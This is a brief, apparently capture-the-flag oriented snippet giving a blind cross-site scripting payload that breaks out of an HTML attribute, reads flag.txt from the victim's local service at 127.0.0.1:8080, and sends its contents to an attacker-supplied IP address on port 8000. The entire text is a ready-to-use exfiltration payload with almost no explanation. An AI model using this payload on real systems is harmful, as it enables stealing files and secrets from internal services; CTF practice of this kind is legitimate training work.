To get flag from a BlindXSS vulnerable server you can use this JS code.

'"><script> 
fetch('http://127.0.0.1:8080/flag.txt')
.then(response => response.text()) 
.then(data => {
    fetch('http://<Your-ip-address-tun0>:8000/?flag=' + encodeURIComponent(data))
})
</script>